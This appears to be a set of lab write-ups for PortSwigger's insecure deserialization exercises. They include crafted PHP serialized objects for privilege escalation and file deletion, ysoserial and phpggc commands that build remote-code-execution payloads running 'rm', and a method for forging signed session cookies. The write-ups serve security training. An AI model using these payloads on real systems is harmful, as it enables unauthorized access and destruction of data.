## Modifying serialized objects

[Modifying serialized objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)

Write-up:

1. Logging in sets a session cookie: `TzTzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d`

2. Base-64 decoding this gets us `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`
Altering the admin value to 1, re-encoding the cookie and changing it in the lab
gets us admin access. Accessing the admin panel allows us to delete user `carlos`
and solve the lab. 

## Modifying serialized data types

[Modifying serialized data types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)

Write-up:

1. Session cookie after login: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ1NHRhNjMzdnNyM3p2NHVpYjdrYW92aTNta284NXVhOCI7fQ%3d%3d`. 

2. Base-64 decoding this gets us: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"u4ta633vsr3zv4uib7kaovi3mko85ua8";}`

3. Crafting the following payload, base-64 encoding it and setting session cookie gets us admin access and allows us to delete user `carlos` and solve the lab:

    `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}`

## Using application functionality to exploit insecure deserialization

[Using application functionality to exploit insecure deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)

Write-up:

1. Decoded session cookie after login as `wiener:peter`: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sfe5z0dkqi5eq6k09qbpgak1z3gbn7x0";s:11:"avatar_link";s:19:"users/wiener/avatar";}`

2. We craft a payload to delete `morale.txt`: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"sfe5z0dkqi5eq6k09qbpgak1z3gbn7x0";s:11:"avatar_link";s:10:"morale.txt";}`

3. Re-encoding it, setting as session cookie and deleting our account allows us to solve the lab.

## Arbitrary object injection in PHP

[Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)

Write-up:

1. Looking at the source code of `/my-account` we find the following: `<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->`
Attempting to use a GET request to get that file returns nothing. We can use the
hint given and access `libs/CustomTemplate.php~` to retrieve the source code.

    ```php
    <?php

    class CustomTemplate {
        private $template_file_path;
        private $lock_file_path;

        public function __construct($template_file_path) {
            $this->template_file_path = $template_file_path;
            $this->lock_file_path = $template_file_path . ".lock";
        }

        private function isTemplateLocked() {
            return file_exists($this->lock_file_path);
        }

        public function getTemplate() {
            return file_get_contents($this->template_file_path);
        }

        public function saveTemplate($template) {
            if (!isTemplateLocked()) {
                if (file_put_contents($this->lock_file_path, "") === false) {
                    throw new Exception("Could not write to " . $this->lock_file_path);
                }
                if (file_put_contents($this->template_file_path, $template) === false) {
                    throw new Exception("Could not write to " . $this->template_file_path);
                }
            }
        }

        function __destruct() {
            // Carlos thought this would be a good idea
            if (file_exists($this->lock_file_path)) {
                unlink($this->lock_file_path);
            }
        }
    }

    ?>
    ```

2. We can use the ``__destruct()`` function to solve the lab: 
`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

    Setting the `lock_file_path` attribute to `/home/carlos/morale.txt` allows us to
    delete that file once the script is executed (by a GET request to `/libs/CustomTemplate.php`).

3. After base-64 and URL encoding (in that order) the object and setting it as the session cookie, we can make
the GET request to solve the lab:   `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D`

## Exploiting Java deserialization with Apache Commons

[Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)

Write-up:

1. We need to use `ysoserial` to solve this lab. After looking at the documentation,
I was able to use the following command to craft an exploit payload:

    ```
    java -jar ysoserial-all.jar \
    --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
    --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
    --add-opens=java.base/java.net=ALL-UNNAMED \
    --add-opens=java.base/java.util=ALL-UNNAMED \
    CommonsCollections4 'rm /home/carlos/morale.txt' | base64
    ```

    This generates a base64 payload.

2. We can use URL-encode the payload, set it as session cookie, and send a request
to solve the lab.

## Exploiting PHP deserialization with a pre-built gadget chain

[Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)

Write-up:

1. We need to find out which framework the application is using. Analyzing the page's
source code shows us a reference to `/cgi-bin/phpinfo.php`. Also, sending a request with 
an invalid cookie shows us an error message that discloses that the web application
is using Symfony Version: 4.3.6.

2. We can use `PGPGGC` to get an exploit: `./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0`
URL-encoding the exploit, setting it as session cookie and sending a request returns an
error: `PHP Fatal error: Uncaught Exception: Signature does not match session`.

3. After further research, I found out the session cookie was a bit more complex.
URL-decoding it reveals:

    ```json
    {
        "token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJsdHNiczVmMTU5dmw3ZmZya29jeDlvNGFidnk1bnBiayI7fQ==",
        "sig_hmac_sha1":"39aa1851b62e717d8daf90e88376fa455f1c21dc"
    }
    ```

    It has a token, which corresponds to the object, and a signature, which is a hash
    that involves the object and the SECRET-KEY in `/cgi-bin/phpinfo.php`. We can
    craft a script to get us a valid cookie: `php-cookie.php`

4. Setting the script's output as the session cookie solves the lab. 

## Exploiting Ruby deserialization using a documented gadget chain

[Exploiting Ruby deserialization using a documented gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain)

Write-up:

1. After some research, we find this [article](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)
Reading it and learning from it allows us to craft the `ruby-gadget-chain.rb` script
that generates a payload: `ruby ruby-gadget-chain.rb` - executable 
on [Ruby 2.x](https://www.tutorialspoint.com/compilers/online-ruby-compiler.htm).

2. URL-encoding the output and setting it as session cookie solves the lab.